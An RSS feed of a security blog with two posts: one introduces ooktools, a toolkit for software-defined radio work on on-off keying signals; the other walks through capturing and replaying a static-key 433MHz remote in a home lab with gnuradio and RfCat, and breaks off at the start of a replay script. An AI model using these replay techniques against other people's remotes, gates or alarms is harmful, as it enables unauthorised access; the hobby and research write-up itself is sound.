<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>#!/slash/note</title>
    <link>https://leonjza.github.io/index.xml</link>
    <description>Recent content on #!/slash/note</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 08 Oct 2016 11:15:00 +0200</lastBuildDate>
    <atom:link href="https://leonjza.github.io/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>ooktools: on-off keying tools for your sdr</title>
      <link>https://leonjza.github.io/blog/2016/10/08/ooktools-on-off-keying-tools-for-your-sdr/</link>
      <pubDate>Sat, 08 Oct 2016 11:15:00 +0200</pubDate>
      
      <guid>https://leonjza.github.io/blog/2016/10/08/ooktools-on-off-keying-tools-for-your-sdr/</guid>
      <description>&lt;p&gt;In a &lt;a href=&#34;https://leonjza.github.io/blog/2016/10/02/reverse-engineering-static-key-remotes-with-gnuradio-and-rfcat/&#34;&gt;previous post&lt;/a&gt;, I spoke about a simple static key remote and how to replicate its signal using a small python script and RfCat. As part of the work done there, I set out to write a small tool that should help with some of the tasks involved with this process.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/banner.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Lets take a look at &lt;code&gt;ooktools&lt;/code&gt;, how to use it and the internals there of. For those in a rush, the repository can be found here: &lt;a href=&#34;https://github.com/leonjza/ooktools&#34;&gt;https://github.com/leonjza/ooktools&lt;/a&gt;.
&lt;/p&gt;

&lt;h2 id=&#34;major-features&#34;&gt;major features&lt;/h2&gt;

&lt;p&gt;Some of the major features in &lt;code&gt;ooktools&lt;/code&gt; include:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Binary string extraction from wave file recordings.&lt;/li&gt;
&lt;li&gt;Wave file cleanups to remove noise in On-off keying recordings.&lt;/li&gt;
&lt;li&gt;Graphing capabilities for wave files.&lt;/li&gt;
&lt;li&gt;General information extraction of wave files.&lt;/li&gt;
&lt;li&gt;Signal recording and playback using &lt;code&gt;json&lt;/code&gt; definition files that can be shared.&lt;/li&gt;
&lt;li&gt;Plotting of data from the previously mentioned &lt;code&gt;json&lt;/code&gt; recordings.&lt;/li&gt;
&lt;li&gt;Signal searching for On-off keying type data.&lt;/li&gt;
&lt;li&gt;Sending signals in both binary, complete PWM formatted or hex strings using an RfCat dongle.&lt;/li&gt;
&lt;li&gt;Gnuradio &lt;code&gt;.grc&lt;/code&gt; template file generation.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Of course, as I get to spend more time on this, this list may grow and most of the functionality may actually be tested / perfected in environments outside of my lab. There are many cases where stuff breaks too. Checkout the &lt;em&gt;Known Issues&lt;/em&gt; section in the source repository.&lt;/p&gt;

&lt;h2 id=&#34;installation&#34;&gt;installation&lt;/h2&gt;

&lt;p&gt;Installing &lt;code&gt;ooktools&lt;/code&gt; &lt;em&gt;should&lt;/em&gt; be as simple as &lt;code&gt;pip install ooktools&lt;/code&gt;. This should take care of all of the dependencies except for &lt;a href=&#34;https://bitbucket.org/atlas0fd00m/rfcat&#34;&gt;RfCat&lt;/a&gt;. For this you can either &lt;code&gt;apt install rfcat&lt;/code&gt; in Kali, or install from source from the &lt;a href=&#34;https://bitbucket.org/atlas0fd00m/rfcat&#34;&gt;RfCat&lt;/a&gt; repository.&lt;/p&gt;

&lt;h2 id=&#34;usage&#34;&gt;usage&lt;/h2&gt;

&lt;p&gt;Using &lt;code&gt;ooktools&lt;/code&gt; should be as simple as just running it with the required arguments. Based on how you chose to install it you can either use the &lt;code&gt;ooktools&lt;/code&gt; command directly, or invoke the module from a cloned repository with &lt;code&gt;python -m ooktools.console&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ooktools --help
         _   _           _
 ___ ___| |_| |_ ___ ___| |___
| . | . | &#39;_|  _| . | . | |_ -|
|___|___|_,_|_| |___|___|_|___|
On-off keying tools for your SD-arrrR
https://github.com/leonjza/ooktools

Usage: ooktools [OPTIONS] COMMAND [ARGS]...

Options:
  --help  Show this message and exit.

Commands:
  gnuradio  GNU Radio Commands.
  signal    Signal Commands.
  wave      Wave File Commands.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A number of &lt;em&gt;sub commands&lt;/em&gt; exist and are categorized according to their main functions. You can get help at any time by supplying the &lt;code&gt;--help&lt;/code&gt; argument. The below example shows help for the &lt;code&gt;signal&lt;/code&gt; sub command:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ooktools signal --help
         _   _           _
 ___ ___| |_| |_ ___ ___| |___
| . | . | &#39;_|  _| . | . | |_ -|
|___|___|_,_|_| |___|___|_|___|
On-off keying tools for your SD-arrrR
https://github.com/leonjza/ooktools

Usage: ooktools signal [OPTIONS] COMMAND [ARGS]...

  Signal Commands.

Options:
  --help  Show this message and exit.

Commands:
  play    Play frames from a source file.
  plot    Plot frames from a recorded signal.
  record  Record frames to a file.
  search  Search for signals.
  send    Send signals using a RFCat dongle.
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;examples&#34;&gt;examples&lt;/h2&gt;

&lt;p&gt;For the rest of the post, I am going to cover some examples to showcase what is possible with &lt;code&gt;ooktools&lt;/code&gt;. Like I have previously mentioned, a lot of the functionality and testing was done in my isolated lab environment, and may actually not work at all for you. Keep this in mind! ;)&lt;/p&gt;

&lt;h3 id=&#34;wave-binary&#34;&gt;wave binary&lt;/h3&gt;

&lt;p&gt;The &lt;code&gt;ooktools wave binary&lt;/code&gt; command can be used to attempt to extract the binary string from a wave file recording. Lets take a sample recording where I extracted a single pulse:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/audacity_single_pulse.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Spotting the key with your eye may be easy in this case, but its a lot harder with longer waves. Anyways, running &lt;code&gt;ooktools wave binary&lt;/code&gt; for this recording should output the binary sequence.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/ooktools_wave_binary.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h3 id=&#34;wave-clean&#34;&gt;wave clean&lt;/h3&gt;

&lt;p&gt;The &lt;code&gt;ooktools wave clean&lt;/code&gt; command takes a source wave file and tries to &lt;em&gt;&amp;lsquo;square out&amp;rsquo;&lt;/em&gt; the signal, removing any jumps in the waveform.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/wave_clean.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The source and destinations files compared after this command can be seen in this screenshot:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/audacity_clean.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h3 id=&#34;wave-graph&#34;&gt;wave graph&lt;/h3&gt;

&lt;p&gt;The &lt;code&gt;ooktools wave graph&lt;/code&gt; command plots the values read from a wave file source. You can interactively pan and zoom the graph to focus on specific areas as needed.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/wave_graph.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h3 id=&#34;signal-search&#34;&gt;signal search&lt;/h3&gt;

&lt;p&gt;The &lt;code&gt;ooktools signal search&lt;/code&gt; commands attempts to find valid on-off keying packets while iterating over a frequency range that is specified. The definition of a &lt;em&gt;valid packet&lt;/em&gt; is currently still a little strange though. :|&lt;/p&gt;

&lt;p&gt;To best show this feature, the following asciinema recording attempts to show the &lt;code&gt;signal search&lt;/code&gt; in action while I hold down the button on my remote:&lt;/p&gt;

&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/88503.js&#34; id=&#34;asciicast-88503&#34; async&gt;&lt;/script&gt;

&lt;h2 id=&#34;signal-record&#34;&gt;signal record&lt;/h2&gt;

&lt;p&gt;The &lt;code&gt;ooktools signal record&lt;/code&gt; command allows you to record a number of frames to a file as you press down on a remote repeatedly. This can then be plotted or simply played back at a later stage.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/signal_record.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;signal-play&#34;&gt;signal play&lt;/h2&gt;

&lt;p&gt;The &lt;code&gt;ooktools signal play&lt;/code&gt; command allows you to replay frames recorded using &lt;code&gt;ooktools signal record&lt;/code&gt;. It literally just plays the frames back.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/signal_play.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;signal-plot&#34;&gt;signal plot&lt;/h2&gt;

&lt;p&gt;The &lt;code&gt;ooktools signal plot&lt;/code&gt; command allows you to create plots of the frames that were recorded using &lt;code&gt;ooktools signal record&lt;/code&gt;. This could be used to very quickly get an idea of the on-off key that may be present on a remote.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/signal_plot.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;signal-send&#34;&gt;signal send&lt;/h2&gt;

&lt;p&gt;The &lt;code&gt;ooktools signal send&lt;/code&gt; sub command helps with sending signals either as binary codes, full PWM codes or hex strings. Example usage of the binary string method is:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/send_binary_data.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The same code as a hex string would be:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/send_hex_data.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;internals-and-development&#34;&gt;internals and development&lt;/h2&gt;

&lt;p&gt;I am sure as more time is spent on the toolkit it will evolve and become a little refined. However, if you wish to hack away at it, hopefully the following bit will help in getting you to understand how its put together.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ooktools&lt;/code&gt; is build around the excellent python &lt;a href=&#34;http://click.pocoo.org/6/&#34;&gt;Click&lt;/a&gt; cli framework. The applications entry point as defined in &lt;code&gt;setup.py&lt;/code&gt; as the &lt;code&gt;cli()&lt;/code&gt; method in &lt;code&gt;ooktools.console&lt;/code&gt;. This is standard bootstrapping to reach the &lt;code&gt;cli()&lt;/code&gt; method. Commands themselves are decorated using the &lt;code&gt;@group.command()&lt;/code&gt; decorator and is grouped according to primary function.&lt;/p&gt;

&lt;p&gt;Once you checked out the &lt;code&gt;console.py&lt;/code&gt; source, you may notice that this file only really handles the commands and arguments to other functions that are defined in &lt;code&gt;ooktools.commands&lt;/code&gt;. It is also responsible for calling the correct validation methods as defined in &lt;code&gt;ooktools.validators&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Once a command is happy with its arguments, the &lt;strong&gt;actual&lt;/strong&gt; work is then in the &lt;code&gt;ooktools.commands.category&lt;/code&gt; scripts.&lt;/p&gt;

&lt;p&gt;As far as dependencies go, at the time of writing &lt;code&gt;ooktools&lt;/code&gt; depends on &lt;em&gt;bitstring&lt;/em&gt;, &lt;em&gt;click&lt;/em&gt;, &lt;em&gt;matplotlib&lt;/em&gt;, &lt;em&gt;numpy&lt;/em&gt; and &lt;em&gt;peakutils&lt;/em&gt;. There is also a requirement for &lt;code&gt;rflib&lt;/code&gt; which comes from the &lt;a href=&#34;https://bitbucket.org/atlas0fd00m/rfcat&#34;&gt;RfCat&lt;/a&gt; repository.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>reverse engineering static key remotes with gnuradio and rfcat</title>
      <link>https://leonjza.github.io/blog/2016/10/02/reverse-engineering-static-key-remotes-with-gnuradio-and-rfcat/</link>
      <pubDate>Sun, 02 Oct 2016 16:05:22 +0200</pubDate>
      
      <guid>https://leonjza.github.io/blog/2016/10/02/reverse-engineering-static-key-remotes-with-gnuradio-and-rfcat/</guid>
      <description>&lt;p&gt;At &lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-index.html&#34;&gt;defcon24&lt;/a&gt; this year, I impulsively bought myself some new toys. Amongst what I got included a &lt;a href=&#34;https://greatscottgadgets.com/yardstickone/&#34;&gt;YARD Stick One&lt;/a&gt; and a &lt;a href=&#34;https://greatscottgadgets.com/ubertoothone/&#34;&gt;Ubertooth One&lt;/a&gt;. I already owned a DVB-T dongle much like &lt;a href=&#34;https://www.amazon.co.uk/Digital-DVB-T-RTL2832U-FC0013B-Receiver/dp/B00NOP0P6W&#34;&gt;this one&lt;/a&gt; that I bought at defcon23 the previous year.&lt;/p&gt;

&lt;p&gt;My interest in Software Defined Radio has long been one of those where I just felt so overwhelmed with the idea for a very long time that I dare not try it. This, together with the fact that its something I &lt;em&gt;totally&lt;/em&gt;  know nothing about really did make for this bit of research to be pretty daunting at first.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_banner.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Nonetheless, here is my adventure into reverse engineering a plain static key remote and successfully replaying it from my computer.
&lt;/p&gt;

&lt;h2 id=&#34;the-terminology&#34;&gt;the terminology&lt;/h2&gt;

&lt;p&gt;Where to start? In hindsight, I guess a sane point of departure would have been to first figure out what all of these new acronyms mean. OOK, PWM, AM, FSK etc were all things I have only seen but never actually knew what they meant. I read a whole bunch of blog posts and other RTL-SDR related stuff, thinking I could just dive right in. It was not long before I realized that its pretty important when someone talks about Pulse Width Modulation(PWM) that I &lt;strong&gt;actually&lt;/strong&gt; know that this means!&lt;/p&gt;

&lt;p&gt;So, as I progressed through the resources I found online, I made a note of looking up the acronyms and what the general idea behind them were. The most important of the acronyms you should know is listed below. You should seriously take some time to look into these in more detail and not just rely on my silly descriptions:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;AM&lt;/strong&gt; - &lt;a href=&#34;https://en.wikipedia.org/wiki/Amplitude_modulation&#34;&gt;Amplitude Modulation&lt;/a&gt;&lt;br /&gt;
When talking &lt;strong&gt;AM&lt;/strong&gt;, we are referring to the fact that the signal strength (or amplitude) is varied according to the waveform that is being transmitted. &lt;a href=&#34;https://upload.wikimedia.org/wikipedia/commons/a/a4/Amfm3-en-de.gif&#34;&gt;This gif&lt;/a&gt; shows a comparison between &lt;strong&gt;AM&lt;/strong&gt; and &lt;strong&gt;FM&lt;/strong&gt; (Frequency Modulation) for the same signal. It should be clear that for the same signal, &lt;strong&gt;AM&lt;/strong&gt; increases the amplitude of the waveform, and &lt;strong&gt;FM&lt;/strong&gt; increases the frequency of the waveform&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;PWM&lt;/strong&gt; - &lt;a href=&#34;https://en.wikipedia.org/wiki/Pulse-width_modulation&#34;&gt;Pulse Width Modulation&lt;/a&gt;&lt;br /&gt;
In addition to &lt;strong&gt;AM&lt;/strong&gt;, in the case of these static key remotes, they make use of &lt;strong&gt;PWM&lt;/strong&gt;. Basically, the duration of a pulse determines the bit that is being send. A long pulse is a zero, and a short pulse is a one.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;OOK&lt;/strong&gt; - &lt;a href=&#34;https://en.wikipedia.org/wiki/On-off_keying&#34;&gt;On-off keying&lt;/a&gt;&lt;br /&gt;
On-off keying is a form of &lt;a href=&#34;https://en.wikipedia.org/wiki/Amplitude-shift_keying&#34;&gt;Amplitude-shift keying&lt;/a&gt; where a binary value is represented based on the duration of the presence of a carrier signal (or a just a high amplitude signal).&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;the-gear&#34;&gt;the gear&lt;/h2&gt;

&lt;p&gt;Once I had a good idea of what all of this stuff means, it was time to get some gear to play with. I went to a local &lt;a href=&#34;http://www.communica.co.za/&#34;&gt;electronics store&lt;/a&gt; to pick up a few things. The most important being a static key remote. I also needed something that will &lt;em&gt;switch on&lt;/em&gt; when the remote is pressed. For this, I settled on a small LED light, just to give an indication of life. All in all I must have spent close to R600 (~40USD) for everything. The list of lab toys included:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;1 x &lt;a href=&#34;http://www.communica.co.za/Catalog/Details/P3842375875&#34;&gt;Basic 433Mhz Binary Code Transmitter&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;1 x &lt;a href=&#34;http://www.communica.co.za/Catalog/Details/P4011845900&#34;&gt;12V Power Supply&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;1 x &lt;a href=&#34;http://www.communica.co.za/Catalog/Details/P3225790564&#34;&gt;Generic, Static Key Receiver&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;1 x &lt;a href=&#34;http://www.communica.co.za/Catalog/Details/P2952215568&#34;&gt;10W LED Light&lt;/a&gt; &lt;strong&gt;(wow this thing is bright!)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;1 x &lt;a href=&#34;http://www.communica.co.za/Catalog/Details/P2750472738&#34;&gt;Enclosure&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Some wiring etc.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I setup, wired together and tested everything. The LED light was wired up to the normally open contact so that when the remote button is pressed, the light will go on for a brief period of time and then switch off.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_lab_gear.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I paired my remote with a random position of the 12 dip switches on it to the receiver and tested that the light actually goes on under normal conditions. Sweet.&lt;/p&gt;

&lt;h2 id=&#34;the-signal-capture&#34;&gt;the signal capture&lt;/h2&gt;

&lt;p&gt;Capturing the remotes signal turned out to be a little easier than I initially expected. I found &lt;strong&gt;plenty&lt;/strong&gt; of resources online that helped me get familiar with ways to do it. The most common capture method I could see was to use a tool called &lt;a href=&#34;http://gqrx.dk/&#34;&gt;GXRQ&lt;/a&gt;. GQRX allows you to tune into the frequency and make a raw recording of the signal to file. This is probably the fastest way to get the recordings to file. The recorded file can then be opened up in &lt;a href=&#34;http://gnuradio.org/&#34;&gt;gnuradio&lt;/a&gt; or &lt;a href=&#34;https://github.com/miek/inspectrum&#34;&gt;inspectrum&lt;/a&gt;. You can do a number of fun things with GQRX, like listening to radio! (I had to enable Hardware AGC in GQRX for this to work) :)&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_fm_radio.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Anyways. I got stuck trying to decode the key from the remote using a GQRX recording. No matter how I loaded it into inspectrum or audacity (or even raw parsing attempts at some stage), I just could not make head or tail of what I was looking at. In fact, it all just turned out to be garbage to me. Maybe because I didn&amp;rsquo;t set it to record AM? Who knows. Anyways.&lt;/p&gt;

&lt;h2 id=&#34;the-gnuradio-reveal&#34;&gt;the gnuradio reveal&lt;/h2&gt;

&lt;p&gt;Speaking to &lt;a href=&#34;https://twitter.com/elasticninja&#34;&gt;@elasticninja&lt;/a&gt; (&lt;em&gt;thanks for your epic patience dude!&lt;/em&gt;), I got tipped off to an absolutely &lt;strong&gt;great&lt;/strong&gt; video by &lt;a href=&#34;https://twitter.com/michaelossmann&#34;&gt;Michael Ossmann&lt;/a&gt; in he&amp;rsquo;s &lt;em&gt;Software Defined Radio with HackRF&lt;/em&gt; series &lt;a href=&#34;https://greatscottgadgets.com/sdr/&#34;&gt;here&lt;/a&gt;. More specifically, &lt;a href=&#34;https://greatscottgadgets.com/sdr/8/&#34;&gt;lesson 8&lt;/a&gt; deals with on-off keying and was excellent in getting me started with gnuradio.&lt;/p&gt;

&lt;p&gt;This lesson does a great job of showing you how to find out more details about a specific remote that you are interested in by looking up its hardware specs, test results and any other pieces of information. It then goes on to explain how to get your first flow graph up and running in gnuradio in no time.&lt;/p&gt;

&lt;h2 id=&#34;preparing-gnuradio&#34;&gt;preparing gnuradio&lt;/h2&gt;

&lt;p&gt;Before building gnuradio flow graphs, a little bit of preparation was needed. I was using a Kali Virtual Machine in VMWare for testing and had to install a few extra packages on top of the base installation. While we on the topic of dependencies, I am just going to list everything needed to replicate that which you will find in this post:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt install gnu-radio rfcat gr-osmosdr audacity
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you want audio to work, I had to enable pulseaudio with these commands followed by a reboot:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;systemctl --user enable pulseaudio &amp;amp;&amp;amp; systemctl --user start pulseaudio
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With that out of the way, I was ready to replicate that flow graph from the lesson.&lt;/p&gt;

&lt;h2 id=&#34;building-the-flow-graph&#34;&gt;building the flow graph&lt;/h2&gt;

&lt;p&gt;Just like the session explained, I launched &lt;code&gt;gnuradio-companion&lt;/code&gt; and built the flow graph the same way:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Launch GNU radio (and start a new WX GUI Graph). I noticed it defaults to the QT GUI in the options block, so just right-click edit that and flip it over to WX GUI.&lt;/li&gt;
&lt;li&gt;Add a new &lt;em&gt;osmocom Source&lt;/em&gt; block to receive data from your RTL-SDR. If you cant find the block, click on any item on the list on the right and hit &lt;em&gt;ctrl-f&lt;/em&gt; to filter.&lt;/li&gt;
&lt;li&gt;Add a new &lt;em&gt;WX GUI FFT Sink&lt;/em&gt; and connect the &lt;em&gt;osmocon Source&lt;/em&gt; and new FFT sink by clicking on the output and input of each.&lt;/li&gt;
&lt;li&gt;Set a higher sample rate of 2000000 in the &lt;code&gt;samp_rate&lt;/code&gt; variable by editing the &lt;em&gt;Variable&lt;/em&gt; block.&lt;/li&gt;
&lt;li&gt;Edit the &lt;em&gt;osmocon Source&lt;/em&gt; block and set the RF Gain to 0 and the frequency to the one you are hoping to listen in on. In my case this is 4339e5, or 4339200000.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Once this is done, save the flow graph and run it (with your RTL-SDR plugged in) to visualize the signal when you press your remote!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_gnu_radio1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Fast forward a bit through the lesson, and we finally get to part where we can visualize the key on the remote as a demodulated waveform with the addition of the second scope sink (around 30mins in). To get a nice and clear picture of the on-off keying, we want to measure the magnitude over time of a sample. This can be done by adding a type converter to the flow graph. The &lt;em&gt;Complex to Mag&lt;/em&gt; type converter will do the job just fine. To add this:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Find the type converter block called &lt;em&gt;Complex to Mag&lt;/em&gt; and drag it onto the flow graph.&lt;/li&gt;
&lt;li&gt;Connect the output from the &lt;em&gt;osmocon Source&lt;/em&gt; to the &lt;em&gt;Complex to Mag&lt;/em&gt; input.&lt;/li&gt;
&lt;li&gt;Connect the output of the &lt;em&gt;Complex to Mag&lt;/em&gt; converter to the Scope sink input.&lt;/li&gt;
&lt;li&gt;Change the input expected by the scope sink from &lt;em&gt;complex&lt;/em&gt; to &lt;em&gt;float&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With this done, run the graph again. You will need to fiddle a little with the seconds per division and counts per division values to get the visualization just right. Unticking the &lt;em&gt;Autorange&lt;/em&gt; box will also greatly help you narrow down the signal. As a last tip, if you experience the graph jumping around too much (from left to right), you can toggle a &amp;lsquo;center&amp;rsquo; by focussing the &lt;em&gt;Trig&lt;/em&gt; tab and setting the lines that appear with the level toggles.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_demodulated_scope.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;As you can see in this screenshot, the keying seems to represent the values:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[short, short, short, long, long, short, short, long, short, short, long, short]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Or:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This indeed matches the switch positions on my remote. Yay!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_real_remote.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;storing-the-recordings&#34;&gt;storing the recordings&lt;/h2&gt;

&lt;p&gt;Looking at those waveforms is cool and all, but it isn&amp;rsquo;t always practical to keep your finger on a button. Instead, we can record the output to a file for later use. You may choose to record the raw, unprocessed signal from the radio (in cases where you may need to still do some processing on the file maybe?) or save the demodulated waveform. To do this, simply add a new &lt;em&gt;Wave File Sink&lt;/em&gt; block after the &lt;em&gt;Complex to Mag&lt;/em&gt; block and specify a destination filename.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_wave_file_sink.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Now, just launch the graph and press down on the remote for a while. When done, stop the graph and check if your file has been written in the location you specified:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;~ # ls -lah remote.wav
-rw-r--r-- 1 root root 7.2M Oct  3 22:07 remote.wav
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great. If you need to re-use this file at a later stage in gnuradio, simply add a &lt;em&gt;File Source&lt;/em&gt; / &lt;em&gt;Wave File Source&lt;/em&gt; block as needed and reconnect the other blocks where appropriate.&lt;/p&gt;

&lt;h2 id=&#34;viewing-in-audacity&#34;&gt;viewing in audacity&lt;/h2&gt;

&lt;p&gt;If you saved the demodulated wave file, then you can open this file in &lt;a href=&#34;http://www.audacityteam.org/&#34;&gt;Audacity&lt;/a&gt;. Simply launch audacity (we already installed it) and open the recorded wave file. Viewing the recording at first may look something like this:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_audacity_full.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;However, when you zoom in a little, you may start seeing the on-off keying becoming obvious:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_audacity_zoomed.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Admittedly, getting this far was relatively easy thanks to the ton of research out there already!&lt;/p&gt;

&lt;h2 id=&#34;introducing-rfcat&#34;&gt;introducing rfcat&lt;/h2&gt;

&lt;p&gt;I guess the main reason why I decided on the YARD Stick One was because of the fact that it comes pre-flashed with the &lt;a href=&#34;https://bitbucket.org/atlas0fd00m/rfcat&#34;&gt;RFcat&lt;/a&gt; firmware. It was only after the fact that I realized its actually a &lt;a href=&#34;https://greatscottgadgets.com/yardstickone/&#34;&gt;pretty good RF device in general&lt;/a&gt;. There are some other radios (maybe cheaper?) that you can flash to work with RFCat such as the &lt;a href=&#34;http://www.ti.com/tool/cc1111emk868-915&#34;&gt;CC1111emk&lt;/a&gt; dongle or the dongle that comes with the &lt;a href=&#34;http://www.ti.com/tool/ez430-chronos&#34;&gt;Chronos watch development kit&lt;/a&gt;. The &lt;a href=&#34;https://bitbucket.org/atlas0fd00m/rfcat/wiki/SupportedDongles&#34;&gt;RFCat wiki&lt;/a&gt; also has a list of compatible dongles.&lt;/p&gt;

&lt;p&gt;As for RFcat itself, I guess the most important thing to realize is that you effectively have a python interface to the underlying radio when using it. Admittedly, there isn&amp;rsquo;t a lot of documentation for RFCat and you may very quickly come to realize that you will have to make use of the &lt;code&gt;help()&lt;/code&gt; strings and the source code of &lt;code&gt;rflib&lt;/code&gt; to learn the necessary. This coupled with existing projects and work online doesn&amp;rsquo;t make it &lt;em&gt;too hard&lt;/em&gt; to get going.&lt;/p&gt;

&lt;p&gt;To give you an idea, below is a sample snippet of starting &lt;code&gt;rfcat&lt;/code&gt; in &lt;em&gt;&amp;lsquo;research&amp;rsquo; (-r)&lt;/em&gt; mode and sending a string as a &amp;lsquo;ping&amp;rsquo; packet. Using RFcat this way, the object &lt;code&gt;d&lt;/code&gt; is used to call methods for the radio:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_rfcat_ping.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;As you can see in the screenshot, there is a banner message giving you some useful hints on how you can interact with the dongle. Methods such as &lt;code&gt;setFreq()&lt;/code&gt;, &lt;code&gt;setMdmModulation()&lt;/code&gt; etc is all things we will be needing soon™ when we want to start replaying the signal of this remote (and switch on that very bright LED!).&lt;/p&gt;

&lt;h2 id=&#34;sending-the-signal-with-rfcat&#34;&gt;sending the signal with RFcat&lt;/h2&gt;

&lt;p&gt;As you may have noticed by now, sending signals with RFCat is as simple as &lt;code&gt;d.RFxmit(data=&#39;DEADBEEF&#39;)&lt;/code&gt;. To get the receiver to understand my replay, I didn&amp;rsquo;t think it would be as easy just playing the raw binary string of &lt;code&gt;111001101101&lt;/code&gt; back. I tested anyways by writing a small script to start sending signals and then captured them using my SDR and gnuradio. The values for the frequency and baud rate is something that you &lt;em&gt;should&lt;/em&gt; be able to get from the data sheets of the remote you are attempting to replay. (I will show you how to calculate the baud rate later though). The original script I used was:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/python

import rflib

d = rflib.RfCat()

# Set Modulation. We using On-Off Keying here
